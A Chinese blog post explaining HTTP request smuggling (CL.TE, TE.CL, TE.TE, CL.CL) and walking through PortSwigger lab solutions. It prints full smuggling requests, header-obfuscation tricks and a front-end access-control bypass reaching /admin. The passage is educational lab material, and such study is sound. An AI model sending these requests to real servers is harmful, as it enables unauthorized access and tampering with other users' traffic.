
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Web安全,HRS,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>浅析HRS漏洞 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        浅析HRS漏洞
      </h1>
      <span>
        
        <time class="time" datetime="2020-03-11T15:59:05.000Z">
        2020-03-11
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HRS/">HRS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>主要参考：<a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p>
<p>实验环境：<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p>
<p>BurpSuite插件http-request-smuggler：<a href="https://github.com/portswigger/http-request-smuggler" target="_blank" rel="noopener">https://github.com/portswigger/http-request-smuggler</a></p>
<p>推荐一些深入浅出的好文：</p>
<p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">一篇文章带你读懂 HTTP Smuggling 攻击</a></p>
<p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
<p>HRS扫描原理及实现：</p>
<p><a href="https://blog.riskivy.com/%E6%B5%81%E9%87%8F%E5%A4%B9%E5%B8%A6http-request-smuggling-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">流量夹带(HTTP Request Smuggling) 检测方案的实现</a></p>
<h2 id="0x01-HRS简介"><a href="#0x01-HRS简介" class="headerlink" title="0x01 HRS简介"></a>0x01 HRS简介</h2><p>HRS全称Http Request Smuggling即HTTP请求走私。HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术，其允许攻击者绕过安全控制，获得对敏感数据的未经授权的访问，并直接危害其他应用程序用户。此外，还可以结合XSS、Web缓存中毒等深入利用。</p>
<p>HRS最早于2005年就被发现了，但因利用方式和危害影响所限被一直忽视。直至最近几年因为重视敏感信息的窃取以及利用新方法的提出才被重新提及。</p>
<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>简单地说，<strong>HRS漏洞的根源在于前端服务器和后端服务器对HTTP请求解析存在二义性</strong>。</p>
<h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><blockquote>
<p>当今的Web应用程序经常在用户和最终应用程序逻辑之间使用HTTP服务器链，即用户将请求发送到前端服务器（有时称为负载均衡器或反向代理），此服务器将请求转发给一个或多个后端服务器。</p>
<p>当前端服务器将HTTP请求转发到后端服务器时，通常会通过相同的后端网络连接发送多个请求，因为这样做的效率和性能要高得多。协议非常简单：一个接一个地发送HTTP请求，接收服务器解析HTTP请求头，以确定一个请求的结束位置和下一个请求开始的位置：</p>
</blockquote>
<p><img src="/2020/03/11/浅析HRS漏洞/1.png" alt=""></p>
<blockquote>
<p>在这种情况下，前端和后端服务器必须就请求之间的边界达成一致。否则，攻击者可能会发送由前端服务器和后端服务器不同解释的模糊请求：</p>
</blockquote>
<p><img src="/2020/03/11/浅析HRS漏洞/2.png" alt=""></p>
<blockquote>
<p>在这里，攻击者将其前端请求的一部分由后端服务器解释为下一个请求的开始。它有效地优先于下一个请求，因此可能会干扰应用程序处理该请求的方式。这是一次请求走私攻击，可能会造成毁灭性的后果。</p>
</blockquote>
<h3 id="两个HTTP头字段"><a href="#两个HTTP头字段" class="headerlink" title="两个HTTP头字段"></a>两个HTTP头字段</h3><p>大多数HRS漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：</p>
<ul>
<li>Content-Length（后面简称CL）</li>
<li>Transfer-Encoding（后面简称TE）</li>
</ul>
<p>CL头很常见，它指定消息体的长度（以字节为单位），比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure>
<p>TE头即传输编码标头，用于指定消息主体使用分组编码。这意味着消息体包含一个或多个数据块。每个块包含以字节为单位的块大小（以十六进制表示），后面是换行符，后面是块内容。消息以0大小的块结束。</p>
<p>chunk传输数据格式如下，其中size的值由16进制表示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>注意：许多安全测试人员不知道可以在HTTP请求中使用TE的原因有二：</p>
<ul>
<li>BurpSuite自动解压分组编码，使消息更易于查看和编辑；</li>
<li>浏览器通常不会在请求中使用TE，而且通常只在服务器响应中看到；</li>
</ul>
<h3 id="二义性造就HRS"><a href="#二义性造就HRS" class="headerlink" title="二义性造就HRS"></a>二义性造就HRS</h3><p>如果一个HTTP请求包含了两个标注请求结束位置不一致的头字段会怎么样呢？</p>
<p>假设前端优先考虑第一个CL，后端优先考虑第二个CL。从后端角度看，TCP的流程可能是以下这样的：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p>
<p>在这个例子中，注入的“G”将攻击绿色用户的请求，他们可能会得到类似于“Unknown method GPOST”的响应。这就是因为前后端服务器对于HTTP请求的结束位置头字段解析的二义性导致的HRS问题。</p>
<p>而在现实中，双CL很少被使用，因为许多系统会明确地拒绝具有多个CL的请求。相反，我们将使用TE攻击系统，不过前提是使用RFC 2616规范。TE是HTTP1.1协议中定义的Web用户向服务器提交数据的一种方法，当服务器收到chunked编码方式的数据时会分配一个缓冲区存放之，如果提交的数据大小未知，客户端会以一个协商好的分块大小向服务器提交数据。</p>
<p>如果接收到的消息同时具有TE头字段和CL头字段，则必须忽略CL头字段。由于RFC 2616规范默许可以使用<code>Transfer-Encoding: chunked</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。</p>
<p>比如前端服务器支持CL，后端服务器支持TE，发送如下请求：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/4.png" alt=""></p>
<p>由于前端服务器不支持TE而后端服务器支持，从而导致”G”注入到了绿色用户的请求，使得HRS攻击成功。</p>
<p>同理，前端服务器支持TE，后端服务器支持CL的例子如下，只需将两个头结束位置的设置颠倒一下即可：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/5.png" alt=""></p>
<h2 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h2><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>CL.TE即前端服务器使用Content-Length头，后端服务器是使用Transfer-Encoding头。</p>
<p>例子如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure>
<p>前端服务器处理CL头并确定请求正文长度为13字节，直到“SMUGGLED”结束，并将此请求转发到后端服务器。但后端服务器处理TE头，因此将消息体视为使用分块编码。它按序处理数据块，但第一个块就为<code>0\r\n\r\n</code>数据块，因此处理终止，后续消息体“SMUGGLED”将不会被执行处理，后端服务器将这些字节视为序列中下一个请求的开始。此时，如果前端服务器继续向后端服务器转发请求，那么后端服务器下一个接收到的请求就会是：SMUGGLED+POST=SMUGGLEDPOST的请求方法，这样，后端服务器会返回响应：Unknown method SMUGGLEDPOST。</p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>TE.CL即前端服务器使用Transfer-Encoding头，后端服务器是使用Content-Length头。</p>
<p>例子如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>这种情况下，前端服务器支持TE，会将消息体视为分块编码方式，它处理第一个长度为8字节的数据块，内容是SMUGGLED，之后解析处理第二个块，它是0长度，因此解析终止。该请求转发到后端服务器之后，由于后端服务器采用CL，按照其中请求主体长度的3个字节，解析会执行到8之后的行开头，所以SMUGGLED及以下的内容就不会被处理，侯丹服务器会将余下内容视为请求序列中下一个请求的起始。</p>
<p>注意：要使用BurpSuite的Repeater发送此请求，首先需要转到Reperter菜单中确保未选中“UpdateContent-Length”选项。此外，还需要包含尾随序列0后面的\r\n\r\n。</p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>TE.TE即前端和后端服务器都支持采用Transfer-Encoding头，但其中一台服务器可以通过某种方式混淆报头，从而避免对其进行处理。从某种意义上还是CL.TE或TE.CL。</p>
<p>这里主要用到混淆TE头的技巧，包括但不限于如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<p>例子如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL.CL"></a>CL.CL</h3><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p>
<p>就这种情况而言，一般都是无法利用了。但是总有服务器不会严格的实现该规范，假设前端服务器和后端服务器在收到类似的请求时，都不会返回400错误，但是前端服务器按照第一个CL的值对请求进行处理，而后端服务器按照第二个CL的值进行处理，这样同样存在HRS漏洞，如前面漏洞原理中讲到的例子：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/3.png" alt=""></p>
<p>但是这种情况极其少见。</p>
<h2 id="0x04-漏洞案例与组合拳"><a href="#0x04-漏洞案例与组合拳" class="headerlink" title="0x04 漏洞案例与组合拳"></a>0x04 漏洞案例与组合拳</h2><h3 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p>
<p>构造报文如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: acf61f721e2f15be80da0791004a0040.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
<p>发送两次即可成功得到GPOST错误响应：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/6.png" alt=""></p>
<p>这是因为前端服务器只认CL头，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>
<p>当请求包经过前端服务器转发给后端服务器时，后端服务器只认TE头，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求，服务器在解析时当然会产生报错了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h3 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p>
<p>首先我们构造如下报文，注意0之后必须要有两个回车：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>发送两次之后得到的是“G0POST”而非“GPOST”：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/7.png" alt=""></p>
<p>要达到题目要求，那么我们修改下请求，中间再夹杂一个报文请求即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>注意，这里GPOST前面的12即是满足chunk格式的十六进制数，指明后面<code>GPOST / HTTP/1.1\r\n</code>的字节数即为0x12=18。</p>
<p>由于前端服务器处理TE头，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对前端服务器来说是一个完整的请求，然后转发给后端服务器；后端服务器处理CL头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>发送两次报文即可成功报错：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/8.png" alt=""></p>
<h3 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>题目要求：本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p>
<p>构造报文如下，经过多种混淆TE头的测试，如下这种形式可行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac201f121ec32767801f0d6a00ff0062.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>这里混淆了TE头。前端服务器能够正常解析这个TE头，将<code>0\r\n\r\n</code>之前的内容都传递给后端服务器；而后端服务器并不能正常解析这个TE头，导致只能解析CL头获取得到请求体大小为4，即只获取了<code>12\r\n</code>的内容，而这之后的“GPOST”开头的内容则放到缓存中和下一个请求合并一起解析，从而成功导致GPOST请求失败。</p>
<p>发送两次报文即可成功报错：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/9.png" alt=""></p>
<h3 id="绕过前端服务器的安全控制"><a href="#绕过前端服务器的安全控制" class="headerlink" title="绕过前端服务器的安全控制"></a>绕过前端服务器的安全控制</h3><blockquote>
<p>在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制。</p>
</blockquote>
<h4 id="CL-TE场景绕过"><a href="#CL-TE场景绕过" class="headerlink" title="CL.TE场景绕过"></a>CL.TE场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p>
<p>先直接用CL.TE的构造报文，改下请求/admin接口即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure>
<p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p>
<p>发送两次，看到是向/admin接口访问了，但是返回说需要本地才能访问：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/10.png" alt=""></p>
<p>在前面构造的报文中添加<code>Host: localhost</code>头字段即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure>
<p>发送两次，能成功访问/admin页面了，这里可看到carlos用户的信息及其删除的接口<code>/admin/delete?username=carlos</code>：</p>
<p><img src="/2020/03/11/浅析HRS漏洞/11.png" alt=""></p>
<p>构造最终的报文访问该删除接口即可：</p>
